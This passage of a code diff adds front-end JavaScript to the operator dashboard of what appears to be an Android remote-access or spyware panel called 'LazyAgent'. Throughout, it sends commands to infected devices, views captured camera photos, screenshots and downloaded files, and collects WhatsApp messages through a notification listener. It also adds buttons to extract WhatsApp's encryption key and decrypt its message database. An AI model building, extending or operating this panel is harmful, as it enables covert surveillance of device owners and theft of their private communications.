+            const checked = document.getElementById('selectAllCheckbox').checked;
+            const checkboxes = document.querySelectorAll('.agent-checkbox');
+
+            checkboxes.forEach(cb => {
+                cb.checked = checked;
+                if (checked) {
+                    selectedAgents.add(cb.value);
+                } else {
+                    selectedAgents.delete(cb.value);
+                }
+            });
+        }
+
+        function selectAllAgents() {
+            const checkboxes = document.querySelectorAll('.agent-checkbox');
+            checkboxes.forEach(cb => {
+                cb.checked = true;
+                selectedAgents.add(cb.value);
+            });
+            document.getElementById('selectAllCheckbox').checked = true;
+        }
+
+        function updateSelectAllState() {
+            const checkboxes = document.querySelectorAll('.agent-checkbox');
+            const allChecked = checkboxes.length > 0 && 
+                Array.from(checkboxes).every(cb => cb.checked);
+            document.getElementById('selectAllCheckbox').checked = allChecked;
+        }
+
+        // ==================== COMMAND MODAL ====================
         function openCommandModal(agentId) {
             currentAgentId = agentId;
             document.getElementById('targetAgentId').value = agentId;
+            document.getElementById('targetAgentDisplay').value = agentId;
+            document.getElementById('commandSelect').value = '';
+            document.getElementById('commandParams').value = '';
             document.getElementById('commandModal').classList.add('active');
         }
-        
+
         function closeModal(modalId) {
             document.getElementById(modalId).classList.remove('active');
         }
-        
+
+        // Close modal on outside click
+        document.querySelectorAll('.modal').forEach(modal => {
+            modal.addEventListener('click', function(e) {
+                if (e.target === this) {
+                    this.classList.remove('active');
+                }
+            });
+        });
+
+        // ==================== EXECUTE COMMAND ====================
         async function executeCommand(event) {
             event.preventDefault();
+
             const agentId = document.getElementById('targetAgentId').value;
             let command = document.getElementById('commandSelect').value;
             const params = document.getElementById('commandParams').value;
+
+            if (!command) {
+                alert('⚠️ Please select a command');
+                return;
+            }
+
+            // Handle SET_WALLPAPER with params
             if (command === 'SET_WALLPAPER' && params) {
                 command = command + ' ' + params;
             }
+
+            // Disable button
+            const submitBtn = event.target.querySelector('button[type="submit"]');
+            submitBtn.disabled = true;
+            submitBtn.textContent = '⏳ Sending...';
+
             try {
                 const response = await fetch('/api/command', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ agent_id: agentId, command })
+                    body: JSON.stringify({ agent_id: agentId, command: command })
                 });
+
+                const data = await response.json();
+
                 if (response.ok) {
-                    alert('✅ Command sent!');
+                    const status = data.sent ? '✅ Sent immediately' : '⏳ Queued (agent offline)';
+                    alert(`✅ Command sent!\n\nCommand: ${command}\nStatus: ${status}\nID: ${data.command_id || 'N/A'}`);
                     closeModal('commandModal');
                 } else {
-                    alert('❌ Error sending command');
+                    alert('❌ Error: ' + (data.error || data.message || 'Unknown error'));
                 }
             } catch (error) {
-                alert('❌ ' + error.message);
+                alert('❌ Error: ' + error.message);
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.textContent = '🚀 Execute';
             }
         }
-        
+
+        // ==================== VIEW RESULTS ====================
         async function viewResults(agentId) {
             try {
-                const response = await fetch(`/api/results/${agentId}?limit=20`);
+                const response = await fetch(`/api/results/${agentId}?limit=30`);
                 const results = await response.json();
-                let html = '';
-                if (results.length === 0) {
-                    html = '<p>No results yet</p>';
-                } else {
-                    html = results.map(r => `
-                        <div class="result-item">
-                            <div class="result-header">
-                                <span class="result-command">${r.command}</span>
-                                <span class="result-time">${new Date(r.created_at).toLocaleString()}</span>
-                            </div>
-                            <div class="result-content">${typeof r.result === 'string' ? r.result : JSON.stringify(r.result, null, 2)}</div>
+
+                let html = `<div style="margin-bottom:15px;">
+                    <button onclick="refreshResults('${agentId}')" class="btn btn-sm">🔄 Refresh</button>
+                    <span style="margin-left:10px;color:#999;font-size:13px;">Showing ${results.length} results</span>
+                </div>`;
+
+                if (!results || results.length === 0) {
+                    html += `
+                        <div class="text-center text-muted" style="padding:30px;">
+                            <div style="font-size:48px;margin-bottom:10px;">📭</div>
+                            <strong>No results yet</strong>
+                            <br><span style="font-size:13px;">Send a command to start collecting data</span>
                         </div>
-                    `).join('');
+                    `;
+                } else {
+                    results.forEach(r => {
+                        let content = r.result;
+                        if (typeof content === 'object') {
+                            content = JSON.stringify(content, null, 2);
+                        }
+
+                        // Highlight status
+                        let statusClass = '';
+                        if (content.includes('"status":"success"')) statusClass = 'status-success';
+                        else if (content.includes('"status":"error"')) statusClass = 'status-error';
+                        else if (content.includes('"status":"warning"')) statusClass = 'status-warning';
+
+                        html += `
+                            <div class="result-item">
+                                <div class="header">
+                                    <span class="command">${r.command}</span>
+                                    <span class="time">${new Date(r.created_at).toLocaleString()}</span>
+                                </div>
+                                <div class="content ${statusClass}">${content}</div>
+                            </div>
+                        `;
+                    });
                 }
+
                 document.getElementById('resultsContainer').innerHTML = html;
                 document.getElementById('resultsModal').classList.add('active');
             } catch (error) {
-                alert('❌ ' + error.message);
+                alert('❌ Error: ' + error.message);
             }
         }
-        
+
+        function refreshResults(agentId) {
+            viewResults(agentId);
+        }
+
+        // ==================== VIEW PHOTOS ====================
         async function viewPhotos(agentId) {
             try {
                 const response = await fetch(`/api/photos/${agentId}`);
                 const data = await response.json();
-                let html = `<h3>📷 Photos (${data.count || 0})</h3>`;
-                if (data.count === 0) {
-                    html += '<p>No photos yet</p>';
+
+                let html = `
+                    <div style="margin-bottom:15px;">
+                        <button onclick="refreshPhotos('${agentId}')" class="btn btn-sm">🔄 Refresh</button>
+                        <span style="margin-left:10px;color:#999;font-size:13px;">📷 ${data.count || 0} photos</span>
+                    </div>
+                `;
+
+                if (!data.photos || data.photos.length === 0) {
+                    html += `
+                        <div class="text-center text-muted" style="padding:30px;">
+                            <div style="font-size:48px;margin-bottom:10px;">📷</div>
+                            <strong>No photos yet</strong>
+                            <br><span style="font-size:13px;">Use CAMERA_SNAPSHOT to take photos</span>
+                        </div>
+                    `;
                 } else {
                     html += '<div class="gallery-grid">';
-                    for (const photo of data.photos) {
+                    data.photos.forEach(photo => {
                         html += `
                             <div class="gallery-item">
-                                <img src="${photo.url}" onclick="window.open('${photo.url}','_blank')" />
-                                <div class="info">${photo.filename}<br>${photo.size_formatted}<br><small>${new Date(photo.modified).toLocaleString()}</small></div>
+                                <img src="${photo.url}" onclick="window.open('${photo.url}','_blank')" 
+                                     onerror="this.style.display='none';this.parentElement.innerHTML='<div class=\\'file-icon\\'>🖼️</div><div class=\\'info\\'><span class=\\'filename\\'>${photo.filename}</span><br><span class=\\'size\\'>${photo.size_formatted}</span></div>'">
+                                <div class="info">
+                                    <div class="filename">${photo.filename}</div>
+                                    <div class="size">${photo.size_formatted}</div>
+                                    <div style="font-size:11px;color:#aaa;">${new Date(photo.modified).toLocaleString()}</div>
+                                    <button onclick="window.open('${photo.url}','_blank')" class="btn btn-sm" style="margin-top:5px;">⬇️ Download</button>
+                                </div>
                             </div>
                         `;
-                    }
+                    });
                     html += '</div>';
                 }
+
                 document.getElementById('resultsContainer').innerHTML = html;
                 document.getElementById('resultsModal').classList.add('active');
             } catch (error) {
-                alert('❌ ' + error.message);
+                alert('❌ Error: ' + error.message);
             }
         }
-        
+
+        function refreshPhotos(agentId) {
+            viewPhotos(agentId);
+        }
+
+        // ==================== VIEW SCREENSHOTS ====================
         async function viewScreenshots(agentId) {
             try {
                 const response = await fetch(`/api/screenshots/${agentId}`);
                 const data = await response.json();
-                let html = `<h3>🖼️ Screenshots (${data.count || 0})</h3>`;
-                if (data.count === 0) {
-                    html += '<p>No screenshots yet</p>';
+
+                let html = `
+                    <div style="margin-bottom:15px;">
+                        <button onclick="refreshScreenshots('${agentId}')" class="btn btn-sm">🔄 Refresh</button>
+                        <span style="margin-left:10px;color:#999;font-size:13px;">🖼️ ${data.count || 0} screenshots</span>
+                    </div>
+                `;
+
+                if (!data.screenshots || data.screenshots.length === 0) {
+                    html += `
+                        <div class="text-center text-muted" style="padding:30px;">
+                            <div style="font-size:48px;margin-bottom:10px;">🖼️</div>
+                            <strong>No screenshots yet</strong>
+                            <br><span style="font-size:13px;">Use SCREENSHOT to capture screen</span>
+                        </div>
+                    `;
                 } else {
                     html += '<div class="gallery-grid">';
-                    for (const ss of data.screenshots) {
+                    data.screenshots.forEach(ss => {
                         html += `
                             <div class="gallery-item">
-                                <img src="${ss.url}" onclick="window.open('${ss.url}','_blank')" />
-                                <div class="info">${ss.filename}<br>${ss.size_formatted}<br><small>${new Date(ss.modified).toLocaleString()}</small></div>
+                                <img src="${ss.url}" onclick="window.open('${ss.url}','_blank')"
+                                     onerror="this.style.display='none';this.parentElement.innerHTML='<div class=\\'file-icon\\'>🖼️</div><div class=\\'info\\'><span class=\\'filename\\'>${ss.filename}</span><br><span class=\\'size\\'>${ss.size_formatted}</span></div>'">
+                                <div class="info">
+                                    <div class="filename">${ss.filename}</div>
+                                    <div class="size">${ss.size_formatted}</div>
+                                    <div style="font-size:11px;color:#aaa;">${new Date(ss.modified).toLocaleString()}</div>
+                                    <button onclick="window.open('${ss.url}','_blank')" class="btn btn-sm" style="margin-top:5px;">⬇️ Download</button>
+                                </div>
                             </div>
                         `;
-                    }
+                    });
                     html += '</div>';
                 }
+
                 document.getElementById('resultsContainer').innerHTML = html;
                 document.getElementById('resultsModal').classList.add('active');
             } catch (error) {
-                alert('❌ ' + error.message);
+                alert('❌ Error: ' + error.message);
             }
         }
-        
+
+        function refreshScreenshots(agentId) {
+            viewScreenshots(agentId);
+        }
+
+        // ==================== VIEW DOWNLOADS ====================
         async function viewDownloads(agentId) {
             try {
                 const response = await fetch(`/api/downloads/${agentId}`);
                 const data = await response.json();
-                let html = `<h3>💾 Downloads (${data.count || 0})</h3>`;
-                if (data.count === 0) {
-                    html += '<p>No downloads yet</p>';
+
+                let html = `
+                    <div style="margin-bottom:15px;">
+                        <button onclick="refreshDownloads('${agentId}')" class="btn btn-sm">🔄 Refresh</button>
+                        <span style="margin-left:10px;color:#999;font-size:13px;">💾 ${data.count || 0} downloads</span>
+                    </div>
+                `;
+
+                if (!data.downloads || data.downloads.length === 0) {
+                    html += `
+                        <div class="text-center text-muted" style="padding:30px;">
+                            <div style="font-size:48px;margin-bottom:10px;">💾</div>
+                            <strong>No downloads yet</strong>
+                            <br><span style="font-size:13px;">Files will appear here after download</span>
+                        </div>
+                    `;
                 } else {
                     html += '<div class="gallery-grid">';
-                    for (const dl of data.downloads) {
+                    data.downloads.forEach(dl => {
+                        const icon = dl.filename.endsWith('.apk') ? '📱' :
+                                     dl.filename.endsWith('.pdf') ? '📄' :
+                                     dl.filename.endsWith('.zip') ? '📦' :
+                                     dl.filename.endsWith('.txt') ? '📝' :
+                                     dl.filename.endsWith('.jpg') || dl.filename.endsWith('.png') ? '🖼️' :
+                                     '📄';
                         html += `
                             <div class="gallery-item">
-                                <div style="font-size:48px;padding:20px;">📄</div>
+                                <div class="file-icon">${icon}</div>
                                 <div class="info">
-                                    <strong>${dl.filename}</strong><br>${dl.size_formatted}<br>
-                                    <small>${new Date(dl.modified).toLocaleString()}</small><br>
-                                    <button onclick="window.open('${dl.url}','_blank')" class="btn btn-sm">Download</button>
+                                    <div class="filename">${dl.filename}</div>
+                                    <div class="size">${dl.size_formatted}</div>
+                                    <div style="font-size:11px;color:#aaa;">${new Date(dl.modified).toLocaleString()}</div>
+                                    <button onclick="window.open('${dl.url}','_blank')" class="btn btn-sm" style="margin-top:5px;">⬇️ Download</button>
                                 </div>
                             </div>
                         `;
-                    }
+                    });
                     html += '</div>';
                 }
+
                 document.getElementById('resultsContainer').innerHTML = html;
                 document.getElementById('resultsModal').classList.add('active');
             } catch (error) {
-                alert('❌ ' + error.message);
+                alert('❌ Error: ' + error.message);
             }
         }
-        
+
+        function refreshDownloads(agentId) {
+            viewDownloads(agentId);
+        }
+
+        // ==================== VIEW WHATSAPP ====================
         async function viewWhatsApp(agentId) {
             try {
                 const response = await fetch(`/api/whatsapp/${agentId}`);
                 const data = await response.json();
-                let html = `<h3>💬 WhatsApp Messages (${data.count || 0})</h3>`;
-                if (data.count === 0) {
+
+                let html = `
+                    <div style="margin-bottom:15px;">
+                        <button onclick="refreshWhatsApp('${agentId}')" class="btn btn-sm">🔄 Refresh</button>
+                        <span style="margin-left:10px;color:#999;font-size:13px;">💬 ${data.count || 0} captured messages</span>
+                        <button onclick="waDecryptAction('${agentId}','info')" class="btn btn-sm btn-warning" style="margin-left:10px;">🔓 Decrypt</button>
+                    </div>
+                `;
+
+                if (!data.messages || data.messages.length === 0) {
                     html += `
-                        <p>No WhatsApp messages captured yet.</p>
-                        <div style="margin-top:15px;padding:15px;background:#fff3cd;border-radius:5px;border:1px solid #ffc107;">
+                        <div class="steps-box">
                             <h4>📌 How to capture WhatsApp messages:</h4>
-                            <ol style="margin-left:20px;margin-top:10px;">
-                                <li>Click <strong>Cmd</strong> on the agent</li>
-                                <li>Select <strong>WA_CAPTURE_START</strong> and Execute</li>
+                            <ol>
+                                <li>Click <span class="highlight">Cmd</span> on the agent</li>
+                                <li>Select <span class="highlight">WA_CAPTURE_START</span> and Execute</li>
                                 <li>Go to Settings → Notification Access</li>
-                                <li>Enable "LazyAgent" notification listener</li>
+                                <li>Enable <span class="highlight">LazyAgent</span> notification listener</li>
                                 <li>Now all WhatsApp messages will be captured</li>
                             </ol>
                         </div>
+                        <div class="text-center text-muted" style="padding:20px;">
+                            <div style="font-size:48px;margin-bottom:10px;">💬</div>
+                            <strong>No messages captured yet</strong>
+                            <br><span style="font-size:13px;">Follow the steps above to start capturing</span>
+                        </div>
                     `;
                 } else {
-                    for (const msg of data.messages) {
+                    data.messages.forEach(msg => {
                         html += `
                             <div class="result-item">
-                                <div class="result-header">
-                                    <span class="result-command">${msg.filename}</span>
-                                    <span class="result-time">${new Date(msg.modified).toLocaleString()} (${msg.size_formatted})</span>
+                                <div class="header">
+                                    <span class="command">${msg.filename}</span>
+                                    <span class="time">${new Date(msg.modified).toLocaleString()} (${msg.size_formatted})</span>
                                 </div>
-                                <div class="result-content" style="max-height:300px;font-size:11px;white-space:pre-wrap;font-family:monospace;">${msg.preview || 'No preview'}</div>
+                                <div class="content" style="max-height:300px;font-size:11px;white-space:pre-wrap;font-family:monospace;">${msg.preview || 'No preview'}</div>
                                 <div style="margin-top:10px;">
                                     <button onclick="window.open('${msg.url}','_blank')" class="btn btn-sm">⬇️ Download</button>
                                 </div>
                             </div>
                         `;
-                    }
+                    });
                 }
+
                 document.getElementById('resultsContainer').innerHTML = html;
                 document.getElementById('resultsModal').classList.add('active');
             } catch (error) {
-                alert('❌ ' + error.message);
+                alert('❌ Error: ' + error.message);
             }
         }
-        
+
+        function refreshWhatsApp(agentId) {
+            viewWhatsApp(agentId);
+        }
+
+        // ==================== VIEW WHATSAPP DECRYPT ====================
+        async function viewWhatsAppDecrypt(agentId) {
+            let html = `
+                <div style="margin-bottom:15px;">
+                    <button onclick="refreshWhatsAppDecrypt('${agentId}')" class="btn btn-sm">🔄 Refresh</button>
+                </div>
+
+                <div class="steps-box">
+                    <h4>🔓 WhatsApp Decryption Guide</h4>
+                    <ol>
+                        <li>Click <span class="highlight">Get Info</span> to check WhatsApp status</li>
+                        <li>If rooted, click <span class="highlight">Extract Key</span> to get encryption key</li>
+                        <li>If not rooted, follow the backup instructions below</li>
+                        <li>Click <span class="highlight">Decrypt DB</span> to decrypt the database</li>
+                        <li>Messages will appear below</li>
+                    </ol>
+                </div>
+
+                <div style="display:flex;gap:10px;margin-bottom:20px;flex-wrap:wrap;">
+                    <button onclick="waDecryptAction('${agentId}','info')" class="btn btn-sm">📋 Get Info</button>
+                    <button onclick="waDecryptAction('${agentId}','extract_key')" class="btn btn-sm btn-warning">🔑 Extract Key</button>
+                    <button onclick="waDecryptAction('${agentId}','decrypt')" class="btn btn-sm btn-success">🔓 Decrypt DB</button>
+                </div>
+
+                <div id="waDecryptResult">
+                    <div class="text-center text-muted" style="padding:20px;">
+                        <div style="font-size:48px;margin-bottom:10px;">🔐</div>
+                        <strong>Click a button above to start</strong>
+                        <br><span style="font-size:13px;">Results will appear here</span>
+                    </div>
+                </div>
+
+                <div id="waDecryptData" style="margin-top:15px;"></div>
+            `;
+
+            document.getElementById('resultsContainer').innerHTML = html;
+            document.getElementById('resultsModal').classList.add('active');
+
+            // Auto get info
+            waDecryptAction(agentId, 'info');
+        }
+
+        function refreshWhatsAppDecrypt(agentId) {
+            viewWhatsAppDecrypt(agentId);
+        }
+
+        // ==================== WHATSAPP DECRYPT ACTIONS ====================
+        async function waDecryptAction(agentId, action) {
+            const resultDiv = document.getElementById('waDecryptResult');
+            const dataDiv = document.getElementById('waDecryptData');
+
+            resultDiv.innerHTML = `
+                <div class="loading-text">
+                    <div class="spinner"></div>
+                    Processing ${action.replace('_', ' ')}...
+                </div>
+            `;
+            dataDiv.innerHTML = '';
+
+            try {
+                const response = await fetch(`/api/whatsapp_decrypt/${agentId}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ action: action })
+                });
+
+                const data = await response.json();
+
+                if (data.status === 'success') {
+                    resultDiv.innerHTML = `
+                        <div style="background:#e8f5e9;padding:15px;border-radius:8px;border:1px solid #4caf50;">
+                            ✅ Command sent successfully! Command ID: ${data.command_id}
+                            <br><span style="font-size:13px;color:#666;">Check results tab for output.</span>
+                        </div>
+                        <div style="margin-top:10px;display:flex;gap:10px;flex-wrap:wrap;">
+                            <button onclick="viewResults('${agentId}')" class="btn btn-sm">📊 View Results</button>
+                            <button onclick="waDecryptAction('${agentId}','info')" class="btn btn-sm">🔄 Refresh Status</button>
+                        </div>
+                    `;
+
+                    // Also get latest results
+                    await fetchWAStatus(agentId);
+                } else {
+                    resultDiv.innerHTML = `
+                        <div style="background:#ffebee;padding:15px;border-radius:8px;border:1px solid #f44336;">
+                            ❌ Error: ${data.message || 'Unknown error'}
+                        </div>
+                    `;
+                }
+            } catch (error) {
+                resultDiv.innerHTML = `
+                    <div style="background:#ffebee;padding:15px;border-radius:8px;border:1px solid #f44336;">
+                        ❌ Error: ${error.message}
+                    </div>
+                `;
+            }
+        }
+
+        async function fetchWAStatus(agentId) {
+            try {
+                const response = await fetch(`/api/whatsapp_decrypt_result/${agentId}`);
+                const results = await response.json();
+
+                const dataDiv = document.getElementById('waDecryptData');
+                if (results && results.length > 0) {
+                    let html = '<h4 style="margin-top:15px;margin-bottom:10px;">📊 Recent WhatsApp Results</h4>';
+                    results.slice(0, 5).forEach(r => {
+                        let content = r.result;
+                        if (typeof content === 'object') {
+                            content = JSON.stringify(content, null, 2);
+                        }
+                        html += `
+                            <div class="result-item" style="border-left-color:${r.command.includes('DECRYPT') ? '#4caf50' : '#ff9800'};">
+                                <div class="header">
+                                    <span class="command">${r.command}</span>
+                                    <span class="time">${new Date(r.created_at).toLocaleString()}</span>
+                                </div>
+                                <div class="content" style="max-height:200px;font-size:11px;">${content}</div>
+                            </div>
+                        `;
+                    });
+                    dataDiv.innerHTML = html;
+                }
+            } catch (error) {
+                // Silent fail
+            }
+        }
+
+        // ==================== PING AGENT ====================
         async function pingAgent(agentId) {
             try {
                 const response = await fetch(`/api/ping/${agentId}`, { method: 'POST' });
-                if (response.ok) alert('🏓 Pong received!');
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.status === 'success') {
+                        alert('🏓 Pong received!\n\nAgent is online and responsive.');
+                    } else {
+                        alert('🏓 Agent responded but with status: ' + (data.status || 'unknown'));
+                    }
+                } else {
+                    alert('❌ No response from agent (offline or unreachable)');
+                }
             } catch (error) {
-                alert('❌ Ping failed');
+                alert('❌ Error: ' + error.message);
             }
         }
-        
-        function logout() {
-            fetch('/logout').then(() => { window.location.href = '/'; });
+
+        // ==================== HELP ====================
+        function showHelp() {
+            fetch('/api/help')
+                .then(r => r.json())
+                .then(data => {
+                    let html = `
+                        <div style="margin-bottom:15px;">
+                            <h4>📋 Available Commands (${data.count})</h4>
+                        </div>
+                        <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:13px;">
+                    `;
+
+                    data.commands.forEach(cmd => {
+                        html += `<div style="background:#f8f9fa;padding:6px 10px;border-radius:4px;font-family:monospace;font-size:12px;">${cmd}</div>`;
+                    });
+
+                    html += '</div>';
+
+                    document.getElementById('resultsContainer').innerHTML = html;
+                    document.getElementById('resultsModal').classList.add('active');
+                })
+                .catch(() => {
+                    alert('❌ Error loading help');
+                });
         }
+
+        // ==================== LOGOUT ====================
+        function logout() {
+            if (confirm('Are you sure you want to logout?')) {
+                fetch('/logout')
+                    .then(() => {
+                        window.location.href = '/';
+                    })
+                    .catch(() => {
+                        window.location.href = '/';
+                    });
+            }
+        }
+
+        // ==================== KEYBOARD SHORTCUTS ====================
+        document.addEventListener('keydown', function(e) {
+            // Escape to close modals
+            if (e.key === 'Escape') {
+                document.querySelectorAll('.modal.active').forEach(modal => {
+                    modal.classList.remove('active');
+                });
+            }
+
+            // Ctrl+R to refresh agents
+            if (e.ctrlKey && e.key === 'r') {
+                e.preventDefault();
+                refreshAgents();
+                updateStats();
+            }
+        });
     </script>
+
 </body>
 </html>
